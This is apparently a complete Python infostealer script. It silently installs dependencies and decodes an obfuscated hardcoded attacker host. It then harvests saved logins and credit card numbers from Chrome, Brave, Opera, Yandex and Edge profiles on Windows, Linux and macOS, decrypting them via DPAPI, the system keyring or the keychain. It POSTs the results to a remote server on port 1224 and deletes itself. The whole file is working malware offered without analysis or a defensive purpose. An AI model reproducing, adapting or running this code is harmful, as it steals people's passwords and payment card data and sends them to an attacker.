# http://95.164.17.24:1224/brow/5346/root

from typing import Union, Type
from datetime import datetime, timedelta
from pathlib import Path
import base64, socket, os, re, json, sqlite3, shutil, time, platform, subprocess, sys, socket, os, re

_m = "-m"
_pp = "pip"
_inl = "install"
os_type = platform.system()
if os_type == "Windows":
    try:
        import win32crypt
    except:
        subprocess.check_call([sys.executable, _m, _pp, _inl, "pywin32"])

try:
    import requests
except:
    subprocess.check_call([sys.executable, _m, _pp, _inl, "requests"])
    import requests
try:
    from Crypto.Hash import SHA1
    from Crypto.Protocol.KDF import PBKDF2
    from Crypto.Cipher import AES
except:
    subprocess.check_call([sys.executable, _m, _pp, _inl, "pycryptodome"])
    from Crypto.Hash import SHA1
    from Crypto.Protocol.KDF import PBKDF2
    from Crypto.Cipher import AES
if os_type == "Linux":
    try:
        import secretstorage
    except:
        subprocess.check_call([sys.executable, _m, _pp, _inl, "secretstorage"])
        import secretstorage

sType = "5346"
gType = "brow"
home = os.path.expanduser("~")
ts = int(time.time() * 1000)
host = "LjE3LjI0OTUuMTY0"
# host="    AuMC4x    MTI3Lj"
hn = ""
if gType == "brow":
    hn = socket.gethostname()
else:
    hn = gType + "_" + socket.gethostname()

host1 = base64.b64decode(host[8:] + host[:8]).decode()
host2 = f"http://{host1}:1224"


class BrowserVersion:
    def __str__(A):
        return A.base_name

    def __eq__(A, __o):
        return A.base_name == __o


class Chrome(BrowserVersion):
    base_name = "chrome"
    v_w = ["chrome", "chrome dev", "chrome beta", "chrome canary"]
    v_l = ["google-chrome", "google-chrome-unstable", "google-chrome-beta"]
    v_m = ["chrome", "chrome dev", "chrome beta", "chrome canary"]


class Brave(BrowserVersion):
    base_name = "brave"
    v_w = ["Brave-Browser", "Brave-Browser-Beta", "Brave-Browser-Nightly"]
    v_l = ["Brave-Browser", "Brave-Browser-Beta", "Brave-Browser-Nightly"]
    v_m = ["Brave-Browser", "Brave-Browser-Beta", "Brave-Browser-Nightly"]


class Opera(BrowserVersion):
    base_name = "opera"
    v_w = ["Opera Stable", "Opera Next", "Opera Developer"]
    v_l = ["opera", "opera-beta", "opera-developer"]
    v_m = [
        "com.operasoftware.Opera",
        "com.operasoftware.OperaNext",
        "com.operasoftware.OperaDeveloper",
    ]


class Yandex(BrowserVersion):
    base_name = "yandex"
    v_w = ["YandexBrowser"]
    v_l = ["YandexBrowser"]
    v_m = ["YandexBrowser"]


class MsEdge(BrowserVersion):
    base_name = "msedge"
    v_w = ["Edge"]
    v_l = []
    v_m = []


available_browsers = [Chrome, Brave, Opera, Yandex, MsEdge]


class ChromeBase:
    def __init__(A, verbose=True, blank_passwords=False):
        A.verbose = verbose
        A.blank_passwords = blank_passwords
        A.values = []
        A.webs = []
        A.target_os = platform.system()

    @staticmethod
    def get_datetime(chromedate):
        return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)

    @staticmethod
    def get(func):
        """
        Update paths with the Chrome versions
        Will change protected members from child class.
        """

        def wrapper(*args):
            cls = args[0]
            sys_ = platform.system()
            base_name = cls.browser.base_name
            vers = None

            if sys_ == "Windows":
                vers = cls.browser.v_w
            elif sys_ == "Linux":
                vers = cls.browser.v_l
            elif sys_ == "Darwin":
                vers = cls.browser.v_m

            for ver in vers:
                for i in range(120):
                    if i == 0:
                        profile = "Default"
                    else:
                        profile = "Profile " + str(i)
                    # Accessing protected member to update the paths.
                    browser_path = cls.browsers_paths[base_name].format(
                        ver=ver, profile=profile
                    )
                    database_path = cls.browsers_database_paths[base_name].format(
                        ver=ver, profile=profile
                    )
                    browser_web_path = cls.browsers_web_paths[base_name].format(
                        ver=ver, profile=profile
                    )

                    if os.path.exists(browser_path) and os.path.exists(database_path):
                        cls._browser_paths.append(browser_path)
                        cls._database_paths.append(database_path)
                    if os.path.exists(browser_web_path):
                        cls._browser_web_paths.append(browser_web_path)

                return func(*args)

        return wrapper

    @staticmethod
    def decrypt_windows_password(password, key):
        0

    @staticmethod
    def decrypt_unix_password(password: bytes, key: bytes) -> str:
        """
        Decrypt Unix Chrome password
        Salt: The salt is â¬Üsaltysaltâ¬" (constant)
        Iterations: 1003(constant) for symmetric key derivation in macOS. 1 iteration in Linux.
        IV: 16 spaces.
        """
        try:
            iv = b" " * 16  # Initialization vector
            password = password[3:]  # Delete the 3 first chars
            cipher = AES.new(key, AES.MODE_CBC, IV=iv)  # Create cipher
            return cipher.decrypt(password).strip().decode("utf8")
        except Exception:
            return ""

    def retrieve_database(self) -> list:
        """
        Retrieve all the information from the databases with encrypted values.
        """
        temp_path = (
            (home + "/AppData/Local/Temp") if self.target_os == "Windows" else "/tmp"
        )
        database_paths, keys = self.database_paths, self.keys
        try:
            for database_path in database_paths:  # Iterate on each available database
                # Copy the file to the temp directory as the database will be locked if the browser is running
                filename = os.path.join(temp_path, "LoginData.db")

                shutil.copyfile(database_path, filename)

                db = sqlite3.connect(filename)  # Connect to database
                cursor = db.cursor()  # Initialize cursor for the connection
                # Get data from the database
                cursor.execute(
                    "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created"
                )

                # Set default values. Some of the values from the database are not filled.
                creation_time = "unknown"
                last_time_used = "unknown"
                key = keys[database_paths.index(database_path)]

                # Iterate over all the rows
                for row in cursor.fetchall():
                    origin_url = row[0]
                    action_url = row[1]
                    username = row[2]
                    encrypted_password = row[3]
                    created = row[4]
                    lastused = row[5]

                    # Decrypt password
                    if self.target_os == "Windows":
                        password = self.decrypt_windows_password(
                            encrypted_password, key
                        )

                    elif self.target_os == "Linux" or self.target_os == "Darwin":
                        password = self.decrypt_unix_password(encrypted_password, key)

                    else:
                        password = ""

                    if password == "" and not self.blank_passwords:
                        continue

                    if created and created != 86400000000:
                        creation_time = str(self.__class__.get_datetime(created))
                    if lastused and lastused != 86400000000:
                        last_time_used = self.__class__.get_datetime(lastused)

                    # Append all values to list
                    self.values.append(
                        dict(
                            origin_url=origin_url,
                            action_url=action_url,
                            username=username,
                            password=password,
                            creation_time=creation_time,
                            last_time_used=last_time_used,
                        )
                    )

                cursor.close()
                db.close()
                try:
                    os.remove(filename)
                except OSError:
                    pass
            return self.values
        except Exception as E:
            return []

    def retrieve_web(self):

        web_paths, keys = self.browser_web_paths, self.keys
        temp_path = (
            (home + "/AppData/Local/Temp") if self.target_os == "Windows" else "/tmp"
        )

        try:
            for web_path in web_paths:
                filename = os.path.join(temp_path, "webdata.db")
                shutil.copyfile(web_path, filename)

                conn = sqlite3.connect(filename)
                cursor = conn.cursor()
                cursor.execute(
                    "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards"
                )

                key = keys[web_paths.index(web_path)]
                for row in cursor.fetchall():
                    if not row[0] or not row[1] or not row[2] or not row[3]:
                        continue

                    # Decrypt password
                    if self.target_os == "Windows":
                        card_number = self.decrypt_windows_password(row[3], key)
                    elif self.target_os == "Linux" or self.target_os == "Darwin":
                        card_number = self.decrypt_unix_password(row[3], key)
                    else:
                        card_number = ""

                    if card_number == "" and not self.blank_passwords:
                        continue

                    self.webs.append(
                        dict(
                            name_on_card=row[0],
                            expiration_month=row[1],
                            expiration_year=row[2],
                            card_number=card_number,
                            date_modified=row[4],
                        )
                    )

                cursor.close()
                conn.close()
                try:
                    os.remove(filename)
                except OSError:
                    pass
        except Exception as E:
            return []

    def pretty_print(self) -> str:
        """
        Return the pretty-printed values
        """
        o = ""
        for dict_ in self.values:
            for val in dict_:
                o += f"{val} : {dict_[val]}\n"
            o += "-" * 50 + "\n"

        for dict_ in self.webs:
            for val in dict_:
                o += f"{val} : {dict_[val]}\n"
            o += "-" * 50 + "\n"

        return o

    def save(
        self,
        fn: Union[Path, str],
        filepath: Union[Path, str],
        blank_file: bool = False,
        verbose: bool = True,
    ) -> bool:
        content = filepath + "\n" + self.pretty_print()
        options = {
            "ts": str(ts),
            "type": sType,
            "hid": hn,
            "ss": str(fn),
            "cc": content,
        }
        url = host2 + "/keys"
        try:
            requests.post(url, data=options)
        except:
            return ""


class Windows(ChromeBase):
    def __init__(
        self,
        browser: Type[BrowserVersion] = Chrome,
        verbose: bool = True,
        blank_passwords: bool = False,
    ):

        super(Windows, self).__init__(verbose, blank_passwords)
        self.browser = browser()
        # This is where all the paths for the installed browsers will be saved
        self._browser_paths = []
        self._database_paths = []
        self._browser_web_paths = []

        self.keys = []
        base_path = home + "/AppData"

        self.browsers_paths = {
            "chrome": os.path.join(
                base_path, r"Local\\Google\\{ver}\\User Data\\Local State"
            ),
            "opera": os.path.join(
                base_path, r"Roaming\\Opera Software\\{ver}\\Local State"
            ),
            "brave": os.path.join(
                base_path, r"Local\\BraveSoftware\\{ver}\\User Data\\Local State"
            ),
            "yandex": os.path.join(
                base_path, r"Local\\Yandex\\{ver}\\User Data\\Local State"
            ),
            "msedge": os.path.join(
                base_path, r"Local\\Microsoft\\{ver}\\User Data\\Local State"
            ),
        }
        self.browsers_database_paths = {
            "chrome": os.path.join(
                base_path, r"Local\\Google\\{ver}\\User Data\\{profile}\\Login Data"
            ),
            "opera": os.path.join(
                base_path, r"Roaming\\Opera Software\\{ver}{profile}\\Login Data"
            ),
            "brave": os.path.join(
                base_path,
                r"Local\\BraveSoftware\\{ver}\\User Data\\{profile}\\Login Data",
            ),
            "yandex": os.path.join(
                base_path, r"Local\\Yandex\\{ver}\\User Data\\{profile}\\Local State"
            ),
            "msedge": os.path.join(
                base_path, r"Local\\Microsoft\\{ver}\\User Data\\{profile}\\Login Data"
            ),
        }
        self.browsers_web_paths = {
            "chrome": os.path.join(
                base_path, r"Local\\Google\\{ver}\\User Data\\{profile}"
            ),
            "opera": os.path.join(
                base_path, r"Roaming\\Opera Software\\{ver}{profile}"
            ),
            "brave": os.path.join(
                base_path, r"Local\\BraveSoftware\\{ver}\\User Data\\{profile}"
            ),
            "yandex": os.path.join(
                base_path, r"Local\\Yandex\\{ver}\\User Data\\{profile}"
            ),
            "msedge": os.path.join(
                base_path, r"Local\\Microsoft\\{ver}\\User Data\\{profile}"
            ),
        }

    @property
    def browser_paths(self):
        return self._browser_paths

    @property
    def database_paths(self):
        return self._database_paths

    @property
    def browser_web_paths(self):
        return self._browser_web_paths

    @ChromeBase.get
    def fetch(self):
        """
        Return database paths and keys for Windows
        """
        # Get the AES key
        self.keys = [
            self.__class__.get_encryption_key(path) for path in self.browser_paths
        ]
        return self.database_paths, self.keys

    @staticmethod
    def get_encryption_key(path: Union[Path, str]):
        """
        Return the encryption key of a path
        """
        try:
            with open(path, "r", encoding="utf-8") as file:  # Open the "Local State"
                local_state = file.read()
                local_state = json.loads(local_state)

            key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            key = key[5:]
            return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
        except:
            return ""

    @staticmethod
    def decrypt_windows_password(password: bytes, key: bytes) -> str:
        try:
            # Get the initialization vector
            iv = password[3:15]
            password = password[15:]
            # Generate cipher
            cipher = AES.new(key, AES.MODE_GCM, iv)
            # Decrypt password
            return cipher.decrypt(password)[:-16].decode()

        except Exception:
            try:
                return str(
                    win32crypt.CryptUnprotectData(password, None, None, None, 0)[1]
                )
            except Exception:
                return ""


class Linux(ChromeBase):
    """Decryption class for Chrome in Linux OS"""

    def __init__(
        self,
        browser: Type[BrowserVersion] = Chrome,
        verbose: bool = False,
        blank_passwords: bool = False,
    ):

        super(Linux, self).__init__(verbose, blank_passwords)

        self.browser = browser()

        # This is where all the paths for the installed browsers will be saved
        self._browser_paths = []
        self._database_paths = []
        self._browser_web_paths = []

        self.keys = []
        base_path = os.getenv("HOME")

        self.browsers_paths = {
            "chrome": base_path + "/.config/{ver}/{profile}",
            "opera": base_path + "/.config/{ver}{profile}",
            "brave": base_path + "/.config/BraveSoftware/{ver}/{profile}",
            "yandex": "",
            "msedge": "",
        }
        self.browsers_database_paths = {
            "chrome": base_path + "/.config/{ver}/{profile}/Login Data",
            "opera": base_path + "/.config/{ver}{profile}/Login Data",
            "brave": base_path + "/.config/BraveSoftware/{ver}/{profile}/Login Data",
            "yandex": "",
            "msedge": "",
        }
        self.browsers_web_paths = {
            "chrome": base_path + "/.config/{ver}/{profile}",
            "opera": base_path + "/.config/{ver}{profile}",
            "brave": base_path + "/.config/BraveSoftware/{ver}/{profile}",
            "yandex": "",
            "msedge": "",
        }

    @property
    def browser_paths(self):
        return self._browser_paths

    @property
    def database_paths(self):
        return self._database_paths

    @property
    def browser_web_paths(self):
        return self._browser_web_paths

    @ChromeBase.get
    def fetch(self):
        """
        Return database paths and keys for Linux
        """
        key = self.get_encryption_key()
        if not key:
            return [], []
        self.keys.append(key)
        return self.database_paths, self.keys

    def get_encryption_key(self) -> bytes:
        """
        Return the encryption key for the browser
        """
        try:
            label = "Chrome Safe Storage"  # Default
            # Some browsers have a different safe storage label
            if self.browser == "opera":
                label = "Chromium Safe Storage"
            elif self.browser == "brave":
                label = "Brave Safe Storage"
            elif self.browser == "yandex":
                label = "Yandex Safe Storage"

            # Default password is peanuts
            passw = "peanuts".encode("utf8")
            # New connection to session bus
            bus = secretstorage.dbus_init()
            collection = secretstorage.get_default_collection(bus)
            for item in collection.get_all_items():  # Iterate
                if item.get_label() == label:
                    passw = item.get_secret().decode("utf-8")
                    break

            return PBKDF2(passw, b"saltysalt", 16, 1)
        except:
            return ""


class Mac(ChromeBase):
    """Decryption class for Chrome in MacOS"""

    def __init__(
        self,
        browser: Type[BrowserVersion] = Chrome,
        verbose: bool = True,
        blank_passwords: bool = False,
    ):
        """
        Decryption class for MacOS. Only tested in the macOS Monterrey version.
        :param browser: Choose which browser use. Available: "chrome" (default), "opera", and "brave".
        :param verbose: print output
        """

        super(Mac, self).__init__(verbose, blank_passwords)
        self.browser = browser()
        self.keys = []
        self._browser_paths = []
        self._database_paths = []
        self._browser_web_paths = []

        self.browsers_paths = {
            "chrome": os.path.expanduser(
                "~/Library/Application Support/Google/{ver}/{profile}"
            ),
            "opera": os.path.expanduser("~/Library/Application Support/{ver}{profile}"),
            "brave": os.path.expanduser(
                "~/Library/Application Support/BraveSoftware/{ver}/{profile}"
            ),
            "yandex": "",
            "msedge": "",
        }

        self.browsers_database_paths = {
            "chrome": os.path.expanduser(
                "~/Library/Application Support/Google/{ver}/{profile}/Login Data"
            ),
            "opera": os.path.expanduser(
                "~/Library/Application Support/{ver}{profile}/Login Data"
            ),
            "brave": os.path.expanduser(
                "~/Library/Application Support/BraveSoftware/{ver}/{profile}/Login Data"
            ),
            "yandex": "",
            "msedge": "",
        }

        self.browsers_web_paths = {
            "chrome": os.path.expanduser(
                "~/Library/Application Support/Google/{ver}/{profile}"
            ),
            "opera": os.path.expanduser("~/Library/Application Support/{ver}{profile}"),
            "brave": os.path.expanduser(
                "~/Library/Application Support/BraveSoftware/{ver}/{profile}"
            ),
            "yandex": "",
            "msedge": "",
        }

    @property
    def browser_paths(self):
        return self._browser_paths

    @property
    def database_paths(self):
        return self._database_paths

    @property
    def browser_web_paths(self):
        return self._browser_web_paths

    @ChromeBase.get
    def fetch(self):
        """
        Return database paths and keys for MacOS
        """
        key = self.get_encryption_key()
        if not key:
            return [], []

        # Decrypt the keychain key to a hex key
        self.keys.append(PBKDF2(key, b"saltysalt", 16, 1003, hmac_hash_module=SHA1))
        return self.database_paths, self.keys

    def get_encryption_key(self) -> Union[str, None]:
        """
        Return the encryption key for the browser

        Note: The system will notify the user and ask for permission
        even running as a sudo user as it's trying to access the keychain.
        """
        try:
            label = "Chrome"  # Default
            # Some browsers have a different safe storage label
            if self.browser == "opera":
                label = "Opera"
            elif self.browser == "brave":
                label = "Brave"
            elif self.browser == "yandex":
                label = "Yandex"

            # Run command
            # Note: this command will prompt a confirmation window
            safe_storage_key = subprocess.check_output(
                f"security 2>&1 > /dev/null find-generic-password -ga '{label}'",
                shell=True,
            )

            # Get key from the output
            return re.findall(r"\"(.*?)\"", safe_storage_key.decode("utf-8"))[0]
        except:
            return ""


if os_type == "Windows":
    oss = Windows
elif os_type == "Linux":
    oss = Linux
elif os_type == "Darwin":
    oss = Mac
else:
    dir = os.getcwd()
    os.remove(dir + "\%s" % sys.argv[0])
    sys.exit(-1)  # Clean exit
idx = 0
for br in available_browsers:
    pax = oss(br, blank_passwords=False)  # Class instance
    pax.fetch()  # Get database paths and keys
    pax.retrieve_database()  # Get the data from the database
    pax.retrieve_web()  # Get the data
    browser_path = home + f"/{br.base_name}"
    pax.save(f"s{idx}", browser_path, blank_file=False, verbose=True)
    idx += 1

dir = os.getcwd()
os.remove(dir + "\%s" % sys.argv[0])